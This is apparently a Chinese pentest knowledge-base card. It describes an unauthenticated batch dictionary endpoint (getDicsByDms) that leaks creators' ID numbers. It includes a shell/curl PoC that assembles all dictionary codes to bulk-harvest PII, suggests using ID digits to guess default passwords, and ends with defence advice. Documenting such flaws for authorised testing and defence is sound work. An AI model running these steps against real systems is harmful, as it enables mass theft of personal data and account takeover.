---
id: web-generic-auth-unauth-dict-batch-dms-admin-idcard-leak
title: 未授权字典批量接口 + dm 全集拼接：一次拉取所有字典创建者身份证
type: scenario
domain: web
path: web/generic/auth
technique: unauthorized-batch-dictionary-dms-pii-leak
aliases:
- getDicsByDms 未授权
- 字典批量查询 身份证
- dm 批量拼接
- 未授权数据字典接口
- createSfzh 泄露
- 接口组合越权
tags:
- web
- authz
- unauthorized
- batch-parameter
- pii
- data-dictionary
- java
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V373
  verified_at: '2026-11-09T06:40:02+08:00'
  notes: 已对照原文全文与 26/26 张截图核对：img20 GET /get?dms= 无 Cookie 即返回字典数据（createSfzh:null），img21 为 jq 格式化后 awk -F 'dm' / grep -v 's' / tr / sort / uniq / paste 提取 dm 的命令与卡内 PoC 一致，img22 /auth/dic/getDicsByDms?dms=<全集> 无 Cookie 返回 {"Name":"超级管理员","Sfzh":...}；与原文「带鉴权取字典树 dm 全集 → 未授权批量接口取 PII」一致，接口主机/路径为个案已用占位符。原文无产品/版本，affected_versions 已 --clear。
---

## 一句话结论

系统中的“按多个字典编码查字典”接口未做鉴权且接受逗号分隔的 `dms` 批量参数，响应里带字典创建者的身份证号（`createSfzh`/`Sfzh`）；攻击者先用已授权的字典树接口拿到全部 `dm` 编码，再用 `jq/awk/sort/paste` 拼成 `dm1,dm2,...` 请求该未授权接口，即可一次性批量拿到所有字典创建者（含超级管理员）的身份证号。

## 原理

- **批量参数降低了利用成本**：接口设计为 `getDicsByDms?dms=dm1,dm2,...`，一次可传多个字典编码；服务端没有限制条数/长度，也没有按调用者过滤，攻击者把所有 `dm` 拼进一个请求即可全量拉取，不必逐个枚举。
- **鉴权缺失/不一致**：该字典查询接口只返回“字典元数据”，开发可能认为不是敏感接口而放行；但响应中的 `createSfzh`、`Sfzh`、`Name` 等字段直接暴露创建者姓名与身份证号。与之相对，字典树/编码列表接口要求登录，形成“列表要登录、批量详情不登录”的鉴权粒度差。
- **接口组合**：单看两个接口都“合理”——一个提供字典编码全集（授权可见），一个按编码查字典（未授权）。攻击者把前者当“键字典”，后者当“值接口”，组合后完成本应需要更高权限的批量 PII 导出。授权设计如果只按接口而不是按资源/字段判断，就会出现这种组合越权。
- **为什么身份证号危害大**：教育/政企系统常用“身份证后六位”作为默认口令或重置凭据；拿到管理员/教职工身份证后可直接尝试登录或重置密码，形成从信息泄露到账号接管的链路。
- **数据清洗**：字典树响应通常是嵌套 JSON，先 `jq` 格式化，再用 `awk -F 'dm'` 提取字段、`grep/tr/sed` 去噪、`sort -u` 去重、`paste -sd ','` 拼接，即可得到可直接放入 `dms=` 参数的字符串。

## 触发条件

- 攻击者持有一个可登录的低权限账号（能访问字典树/基础数据接口），或字典树接口本身可未授权访问。
- 系统存在按多个编码批量查询字典/基础数据的接口，且该接口未鉴权或鉴权弱于列表接口。
- 响应中包含超出“字典名称/编码”的敏感字段（创建者姓名、身份证、手机号等）。
- `dm` 编码可从上一条响应中枚举（或可从页面/JS/字典接口获取）。

## 利用步骤

1. 用低权限账号登录，抓取字典树/字典列表响应（示例返回 `{"data":[{"dm":"...","mc":"数据字典",...}]}`）。
2. 将响应保存为 `trees.txt`，`jq . trees.txt > trees_json.txt` 格式化。
3. 提取 `dm` 并清洗去重：
   ```bash
   cat trees_json.txt | awk -F 'dm' '{print $2}' | grep -v 's' | tr -d ' :,"' | grep -v '^$' | sort | uniq | paste -sd ','
   ```
   输出即 `dm1,dm2,dm3,...`（写入 `result_dic.txt`）。
4. 把拼接结果放入批量接口请求：
   ```http
   GET /<module>/getDicsByDms?dms=dm1,dm2,dm3,... HTTP/1.1
   Host: target
   ```
5. 在响应中筛选 `createSfzh`、`Sfzh`、`Name` 等字段；示例响应会返回 `"Name": "超级管理员", "Sfzh": "<身份证号>"`。
6. 用得到的身份证后六位尝试目标系统默认口令/重置密码流程（需授权并遵守测试边界），或作为社工/进一步攻击的素材。

## PoC

```bash
# 1) 保存字典树响应并格式化
jq . trees.txt > trees_json.txt

# 2) 提取 dm、去噪、去重、逗号拼接
cat trees_json.txt \
  | awk -F 'dm' '{print $2}' \
  | grep -v 's' \
  | tr -d ' :,"' \
  | grep -v '^$' \
  | sort | uniq | paste -sd ',' > result_dic.txt

# 3) 批量查询未授权字典接口
DMS=$(cat result_dic.txt)
curl -s "https://target/<module>/getDicsByDms?dms=${DMS}" | jq '.data[] | {Name, Sfzh, createSfzh}'
```

响应示例（字段名依目标而定）：

```json
{"data":[
  {"dm":"...","mc":"数据字典","createSfzh":null},
  {"dm":"...","mc":"...","Name":"超级管理员","Sfzh":"<身份证号>"}
]}
```

## 变体与关联

- **批量参数类型**：除 `dms` 外，`ids`、`codes`、`uids`、`keys` 等逗号/数组参数同样可能被用于批量拉取；数组 JSON（`{"ids":[...]}`）也可能绕过按单条接口做的归属校验。
- **接口粒度不一致**：单条接口做了归属校验、列表接口未做；见 [[web-generic-auth-endpoint-granularity-unauth-list-bulk-pii]]。
- **参数制空/通配符全量返回**：删除查询参数或传空/通配符导致全表返回；见 [[web-generic-auth-idor-empty-wildcard-type-query-collapse]]。
- **默认口令链**：身份证后六位作为默认口令/重置凭据；见 [[pentest-initial-access-public-manual-default-password-pii-leak]]、[[web-generic-auth-roleid-roleids-parameter-tampering-admin]]。
- **防御绕过**：如果批量接口限制了单次条数，可分批请求或利用分页；如果只对新版接口鉴权，旧版/别名路径可能仍然放行。

## 检测与防御

- **统一鉴权**：字典、基础数据、批量查询接口全部纳入统一认证与授权；不能因为“只是字典”就放行，尤其是响应含 PII 字段时。
- **字段最小化**：字典元数据只返回编码/名称/排序等必要字段；创建者信息应脱敏或不返回，删除 `createSfzh` 等敏感字段。
- **批量参数限制**：限制单次 `dms` 条数与总长度，按调用者权限过滤可查询的字典范围，必要时改为分页查询。
- **审计与监控**：对批量参数请求的长度/条数、返回记录数、PII 字段访问做告警；对低权限账号短时间拉取大量字典记录的行为重点审计。
- **授权测试**：在授权范围内验证，避免把身份证号等真实 PII 写入报告/日志；报告中使用脱敏示例。
